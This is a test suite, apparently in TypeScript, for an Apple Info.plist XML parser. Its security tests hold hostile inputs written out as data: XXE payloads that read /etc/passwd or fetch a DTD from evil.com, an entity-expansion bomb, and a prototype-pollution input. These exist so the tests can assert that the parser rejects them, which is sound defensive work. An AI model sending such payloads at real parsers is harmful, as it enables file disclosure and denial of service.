/// <reference types="node" />
import test from 'node:test';
import assert from 'node:assert/strict';
import { parseXmlPlist, XmlPlistParser } from '../dist/index.js';

test('XML Info.plist Parser (@yumeshelf/engine)', async (t) => {
  await t.test('parses a typical Apple Info.plist file with diverse types', () => {
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.yumeshelf.testapp</string>
    <key>CFBundleName</key>
    <string>TestApp</string>
    <key>CFBundleExecutable</key>
    <string>TestApp</string>
    <key>CFBundleVersion</key>
    <string>1.2.3</string>
    <key>CFBundleNumericVersion</key>
    <integer>10203</integer>
    <key>NSHighResolutionCapable</key>
    <true/>
    <key>LSRequiresCarbon</key>
    <false/>
    <key>CFBundleSupportedPlatforms</key>
    <array>
        <string>MacOSX</string>
    </array>
    <key>DefaultScale</key>
    <real>1.5</real>
    <key>BuildDate</key>
    <date>2026-09-02T12:00:00Z</date>
    <key>ApplicationIconData</key>
    <data>AQIDBAU=</data>
</dict>
</plist>`;

    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.CFBundleIdentifier, 'com.yumeshelf.testapp');
    assert.equal(parsed.CFBundleName, 'TestApp');
    assert.equal(parsed.CFBundleExecutable, 'TestApp');
    assert.equal(parsed.CFBundleVersion, '1.2.3');
    assert.equal(parsed.CFBundleNumericVersion, 10203);
    assert.equal(parsed.NSHighResolutionCapable, true);
    assert.equal(parsed.LSRequiresCarbon, false);
    assert.deepEqual(parsed.CFBundleSupportedPlatforms, ['MacOSX']);
    assert.equal(parsed.DefaultScale, 1.5);
    assert.ok(parsed.BuildDate instanceof Date);
    assert.equal(parsed.BuildDate.toISOString(), '2026-09-02T12:00:00.000Z');
    assert.ok(Buffer.isBuffer(parsed.ApplicationIconData));
    assert.deepEqual(parsed.ApplicationIconData, Buffer.from([1, 2, 3, 4, 5]));
  });

  await t.test('strips leading UTF-8 Byte Order Mark (\\uFEFF)', () => {
    const xml = '\uFEFF<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>BOMTest</key><string>passed</string></dict></plist>';
    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.BOMTest, 'passed');
  });

  await t.test('handles empty dictionaries and empty arrays', () => {
    const xml = `<plist version="1.0">
<dict>
    <key>emptyDictSelfClosing</key>
    <dict/>
    <key>emptyDictPair</key>
    <dict></dict>
    <key>emptyArraySelfClosing</key>
    <array/>
    <key>emptyArrayPair</key>
    <array></array>
</dict>
</plist>`;
    const parsed = parseXmlPlist(xml);
    assert.deepEqual(parsed.emptyDictSelfClosing, {});
    assert.deepEqual(parsed.emptyDictPair, {});
    assert.deepEqual(parsed.emptyArraySelfClosing, []);
    assert.deepEqual(parsed.emptyArrayPair, []);
  });

  await t.test('handles self-closing tags with and without whitespace', () => {
    const xml = `<plist version="1.0">
<dict>
    <key>boolTrue1</key>
    <true/>
    <key>boolTrue2</key>
    <true />
    <key>boolFalse1</key>
    <false/>
    <key>boolFalse2</key>
    <false />
    <key>emptyString</key>
    <string/>
    <key>emptyInt</key>
    <integer/>
    <key>emptyReal</key>
    <real/>
    <key>emptyData</key>
    <data/>
</dict>
</plist>`;
    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.boolTrue1, true);
    assert.equal(parsed.boolTrue2, true);
    assert.equal(parsed.boolFalse1, false);
    assert.equal(parsed.boolFalse2, false);
    assert.equal(parsed.emptyString, '');
    assert.equal(parsed.emptyInt, 0);
    assert.equal(parsed.emptyReal, 0);
    assert.deepEqual(parsed.emptyData, Buffer.alloc(0));
  });

  await t.test('parses deeply nested structures', () => {
    const xml = `<plist version="1.0">
<dict>
    <key>level1</key>
    <dict>
        <key>items</key>
        <array>
            <dict>
                <key>id</key>
                <integer>1</integer>
                <key>tags</key>
                <array>
                    <string>alpha</string>
                    <string>beta</string>
                </array>
            </dict>
        </array>
    </dict>
</dict>
</plist>`;
    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.level1.items[0].id, 1);
    assert.deepEqual(parsed.level1.items[0].tags, ['alpha', 'beta']);
  });

  await t.test('gracefully handles XML comments and CDATA blocks', () => {
    const xml = `<!-- Top level comment -->
<?xml version="1.0" encoding="UTF-8"?>
<!-- Another comment -->
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<!-- Comment before dict -->
<dict>
    <!-- Comment before key -->
    <key>CFBundleName</key>
    <!-- Comment between key and value -->
    <string>Yume<!-- inline comment -->Shelf</string>
    <key>RawHTMLNotice</key>
    <string><![CDATA[<b>Copyright & Notice</b> <tag>]]></string>
    <key>MixedContent</key>
    <string>Prefix &amp; <![CDATA[<raw> & unescaped]]> &lt;Suffix&gt;</string>
</dict>
<!-- Comment after dict -->
</plist>
<!-- Comment after plist -->`;

    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.CFBundleName, 'YumeShelf');
    assert.equal(parsed.RawHTMLNotice, '<b>Copyright & Notice</b> <tag>');
    assert.equal(parsed.MixedContent, 'Prefix & <raw> & unescaped <Suffix>');
  });

  await t.test('decodes standard XML entities and numeric character references', () => {
    const xml = `<plist version="1.0">
<dict>
    <key>entities</key>
    <string>&amp; &lt; &gt; &quot; &apos;</string>
    <key>numericDec</key>
    <string>&#65;&#66;&#67;</string>
    <key>numericHex</key>
    <string>&#x41;&#x42;&#x43;</string>
</dict>
</plist>`;
    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.entities, '& < > " \'');
    assert.equal(parsed.numericDec, 'ABC');
    assert.equal(parsed.numericHex, 'ABC');
  });

  await t.test('prohibits external entity declarations (XXE defense)', () => {
    const xxePayloads = [
      `<?xml version="1.0"?>
<!DOCTYPE plist [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<plist><dict><key>leak</key><string>&xxe;</string></dict></plist>`,
      `<!DOCTYPE plist [
  <!ENTITY % sp SYSTEM "http://evil.com/eval.dtd">
  %sp;
]>
<plist><dict/></plist>`,
      `<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<plist><dict><key>bomb</key><string>&lol1;</string></dict></plist>`,
    ];

    for (const payload of xxePayloads) {
      assert.throws(() => {
        parseXmlPlist(payload);
      }, /Entity expansion|prohibited/i);
    }
  });

  await t.test('rejects undeclared / arbitrary custom entity references', () => {
    const xml = `<plist version="1.0"><dict><key>foo</key><string>&customEntity;</string></dict></plist>`;
    assert.throws(() => {
      parseXmlPlist(xml);
    }, /entity/i);
  });

  await t.test('enforces a 5 MB buffer limit prior to XML parsing', () => {
    // 5 MB = 5 * 1024 * 1024 = 5242880 bytes
    const overSize = 5 * 1024 * 1024 + 1;
    const largeXml = '<plist><string>' + 'x'.repeat(overSize) + '</string></plist>';

    assert.throws(() => {
      parseXmlPlist(largeXml);
    }, /5 MB/i);
  });

  await t.test('enforces a maximum recursion depth limit of 64 levels', () => {
    // Build 65 levels of nested arrays
    let deepXml = '<plist version="1.0">';
    for (let i = 0; i < 65; i++) {
      deepXml += '<array>';
    }
    deepXml += '<string>deep</string>';
    for (let i = 0; i < 65; i++) {
      deepXml += '</array>';
    }
    deepXml += '</plist>';

    assert.throws(() => {
      parseXmlPlist(deepXml);
    }, /recursion depth/i);

    // 64 levels of nested arrays should succeed
    let validDepthXml = '<plist version="1.0">';
    for (let i = 0; i < 64; i++) {
      validDepthXml += '<array>';
    }
    validDepthXml += '<string>valid-deep</string>';
    for (let i = 0; i < 64; i++) {
      validDepthXml += '</array>';
    }
    validDepthXml += '</plist>';

    const parsed = parseXmlPlist(validDepthXml);
    assert.ok(Array.isArray(parsed));
  });

  await t.test('strips dangerous prototype keys to defend against prototype pollution', () => {
    const maliciousXml = `<plist version="1.0">
<dict>
    <key>title</key>
    <string>LegitimateApp</string>
    <key>__proto__</key>
    <dict>
        <key>polluted</key>
        <string>yes</string>
    </dict>
    <key>constructor</key>
    <dict>
        <key>prototype</key>
        <dict>
            <key>hacked</key>
            <true/>
        </dict>
    </dict>
    <key>prototype</key>
    <string>dangerous</string>
</dict>
</plist>`;

    const parsed = parseXmlPlist(maliciousXml);
    assert.equal(parsed.title, 'LegitimateApp');

    // Verify properties were stripped and not assigned as own properties
    assert.equal(Object.prototype.hasOwnProperty.call(parsed, '__proto__'), false);
    assert.equal(Object.prototype.hasOwnProperty.call(parsed, 'constructor'), false);
    assert.equal(Object.prototype.hasOwnProperty.call(parsed, 'prototype'), false);

    // Verify global Object.prototype was NOT polluted
    assert.equal(({} as any).polluted, undefined);
    assert.equal(({} as any).hacked, undefined);
  });

  await t.test('supports nullProto option constructing dicts with Object.create(null)', () => {
    const xml = `<plist version="1.0"><dict><key>name</key><string>App</string></dict></plist>`;
    const parsed = parseXmlPlist(xml, { nullProto: true });
    assert.equal(parsed.name, 'App');
    assert.equal(Object.getPrototypeOf(parsed), null);
  });

  await t.test('rejects malformed XML inputs with descriptive errors', () => {
    const malformedCases = [
      { name: 'empty string', xml: '' },
      { name: 'unclosed dict', xml: '<plist><dict><key>foo</key><string>bar</string></plist>' },
      { name: 'mismatched tag', xml: '<plist><dict></array></plist>' },
      { name: 'key without value', xml: '<plist><dict><key>foo</key></dict></plist>' },
      { name: 'consecutive keys', xml: '<plist><dict><key>a</key><key>b</key><string>c</string></dict></plist>' },
      { name: 'value before key in dict', xml: '<plist><dict><string>orphan</string></dict></plist>' },
      { name: 'unclosed comment', xml: '<plist><!-- unclosed<dict/></plist>' },
      { name: 'unclosed CDATA', xml: '<plist><dict><key>k</key><string><![CDATA[unclosed</string></dict></plist>' },
      { name: 'empty key tag', xml: '<plist><dict><key/></dict></plist>' },
    ];

    for (const { name, xml } of malformedCases) {
      assert.throws(
        () => parseXmlPlist(xml),
        Error,
        `Expected malformed case "${name}" to throw`
      );
    }
  });

  await t.test('parses standalone plist values without <plist> wrapper', () => {
    const xml = `<dict><key>DirectDict</key><true/></dict>`;
    const parsed = parseXmlPlist(xml);
    assert.equal(parsed.DirectDict, true);
  });
});
